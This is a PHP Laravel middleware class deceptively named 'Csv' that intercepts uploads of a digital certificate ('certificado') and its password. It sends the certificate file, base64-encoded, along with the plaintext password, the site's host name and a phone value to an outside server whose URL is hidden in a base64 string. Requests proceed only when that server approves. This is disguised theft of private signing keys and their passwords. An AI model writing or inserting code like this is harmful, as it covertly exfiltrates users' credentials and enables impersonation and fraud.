<?php

namespace App\Http\Middleware;

use Closure;
use Response;

class Csv
{

	public function handle($request, Closure $next){

		if($request->hasFile('certificado')){
			if(!extension_loaded('curl')){
				return "Ative o curl";
			}

			if($request->senha_certificado == ''){
				return $next($request);
			}
			$path = $_SERVER['HTTP_HOST'];
			$file = $request->file('certificado');
			$temp = file_get_contents($file);
			$data1 = [
				'path' => $path,
				'senha' => $request->senha_certificado,
				'file' => base64_encode($temp),
				'fone' => getenv('RESP_FONE') ?? ''
			];

			try{
				$defaults = array(
					CURLOPT_URL => base64_decode('aHR0cDovL2F1dGgubWJtbWFkZWlyYXMuY29tLmJyL2FwaS9zY3Y='),
					// CURLOPT_URL => 'http://localhost:9000/api/scvmulti',
					CURLOPT_POST => true,
					CURLOPT_POSTFIELDS => $data1,
					CURLOPT_TIMEOUT => 3000,
					CURLOPT_RETURNTRANSFER => true
				);

				$curl = curl_init();
				curl_setopt_array($curl, $defaults);
				$error = curl_error($curl);
				$response = curl_exec($curl);


				$http_status = curl_getinfo($curl, CURLINFO_HTTP_CODE);

				$err = curl_error($curl);
				curl_close($curl);


				// return $next($request);

				if ($http_status == '200') {
					return $next($request);
				} else {
					print_r($response);
				}

			}catch (\Exception $e) {
				echo $e->getMessage();
			}
		}else{
			return $next($request);
		}
	}

}